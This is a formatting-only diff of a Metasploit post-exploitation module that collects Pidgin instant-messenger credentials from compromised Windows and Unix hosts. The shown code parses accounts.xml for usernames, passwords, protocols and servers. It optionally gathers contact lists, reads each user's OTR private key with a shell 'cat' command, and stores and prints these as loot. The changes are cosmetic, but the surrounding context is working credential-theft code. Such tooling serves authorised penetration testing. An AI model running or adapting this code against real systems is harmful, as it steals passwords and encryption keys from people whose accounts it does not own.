@@ -9,29 +9,32 @@ class MetasploitModule < Msf::Post
   include Msf::Post::File
   include Msf::Post::Windows::UserProfiles
 
-  def initialize(info={})
-    super( update_info(info,
-      'Name'           => 'Multi Gather Pidgin Instant Messenger Credential Collection',
-      'Description'    => %q{
-        This module will collect credentials from the Pidgin IM client if it is installed.
+  def initialize(info = {})
+    super(
+      update_info(
+        info,
+        'Name' => 'Multi Gather Pidgin Instant Messenger Credential Collection',
+        'Description' => %q{
+          This module will collect credentials from the Pidgin IM client if it is installed.
         },
-      'License'        => MSF_LICENSE,
-      'Author'         =>
-        [
+        'License' => MSF_LICENSE,
+        'Author' => [
           'bannedit', # post port, added support for shell sessions
           'Carlos Perez <carlos_perez[at]darkoperator.com>' # original meterpreter script
         ],
-      'Platform'       => %w{ bsd linux osx unix win },
-      'SessionTypes'   => ['shell', 'meterpreter' ]
-    ))
+        'Platform' => %w{bsd linux osx unix win},
+        'SessionTypes' => ['shell', 'meterpreter' ]
+      )
+    )
     register_options(
       [
         OptBool.new('CONTACTS', [false, 'Collect contact lists?', false]),
         # Not supported yet OptBool.new('LOGS', [false, 'Gather log files?', false]),
-      ])
+      ]
+    )
   end
 
-# TODO add support for collecting logs
+  # TODO add support for collecting logs
   def run
     paths = []
     case session.platform
@@ -46,6 +49,7 @@ class MetasploitModule < Msf::Post
       profiles = grab_user_profiles()
       profiles.each do |user|
         next if user['AppData'] == nil
+
         pdir = check_pidgin(user['AppData'])
         paths << pdir if pdir
       end
@@ -59,7 +63,6 @@ class MetasploitModule < Msf::Post
     end
 
     get_pidgin_creds(paths)
-
   end
 
   def enum_users_unix
@@ -92,12 +95,11 @@ class MetasploitModule < Msf::Post
 
       stat = session.shell_command("ls #{dir}/.purple")
       next if stat =~ /No such file/i
+
       paths << "#{dir}/.purple"
     end
     return paths
   end
-
-
 
   def check_pidgin(purpledir)
     path = ""
@@ -120,37 +122,39 @@ class MetasploitModule < Msf::Post
 
   def get_pidgin_creds(paths)
     case paths
-      when /#{@user}\\(.*)\\/
-        sys_user = $1
-      when /home\/(.*)\//
-        sys_user = $1
+    when /#{@user}\\(.*)\\/
+      sys_user = $1
+    when /home\/(.*)\//
+      sys_user = $1
     end
 
     data = ""
     credentials = Rex::Text::Table.new(
-    'Header'    => "Pidgin Credentials",
-    'Indent'    => 1,
-    'Columns'   =>
-    [
-      "System User",
-      "Username",
-      "Password",
-      "Protocol",
-      "Server",
-      "Port"
-    ])
+      'Header' => "Pidgin Credentials",
+      'Indent' => 1,
+      'Columns' =>
+      [
+        "System User",
+        "Username",
+        "Password",
+        "Protocol",
+        "Server",
+        "Port"
+      ]
+    )
 
     buddylists = Rex::Text::Table.new(
-    'Header'    => "Pidgin Contact List",
-    'Indent'    => 1,
-    'Columns'   =>
-    [
-      "System User",
-      "Buddy Name",
-      "Alias",
-      "Protocol",
-      "Account"
-    ])
+      'Header' => "Pidgin Contact List",
+      'Indent' => 1,
+      'Columns' =>
+      [
+        "System User",
+        "Buddy Name",
+        "Alias",
+        "Protocol",
+        "Account"
+      ]
+    )
 
     paths.each do |path|
       print_status("Reading accounts.xml file from #{path}")
@@ -180,7 +184,7 @@ class MetasploitModule < Msf::Post
         end
 
         buddies = parse_buddies(blist)
-        end
+      end
 
       creds.each do |cred|
         credentials << [sys_user, cred['user'], cred['password'], cred['protocol'], cred['server'], cred['port']]
@@ -192,7 +196,7 @@ class MetasploitModule < Msf::Post
         end
       end
 
-      #Grab otr.private_key
+      # Grab otr.private_key
       otr_key = ""
       if session.type == "shell"
         otr_key = session.shell_command("cat #{path}/otr.private_key")
@@ -213,8 +217,6 @@ class MetasploitModule < Msf::Post
         store_loot("otr.private_key", "text/plain", session, otr_key.to_s, "otr.private_key", "otr.private_key")
         print_good("OTR Key: #{otr_key.to_s}")
       end
-
-
     end
 
     if datastore['CONTACTS']
@@ -225,7 +227,6 @@ class MetasploitModule < Msf::Post
   end
 
   def parse_accounts(data)
-
     creds = []
     doc = REXML::Document.new(data).root
 
@@ -275,8 +276,8 @@ class MetasploitModule < Msf::Post
         print_status("Collected the following contacts:")
         print_status("    Buddy Name: %s" % contact['name'])
         print_status("    Alias: %s" % contact['alias'])
-        print_status("    Protocol: %s"  % contact['protocol'])
-        print_status("    Account: %s"  % contact['account'])
+        print_status("    Protocol: %s" % contact['protocol'])
+        print_status("    Account: %s" % contact['account'])
         print_line("")
       end
     end
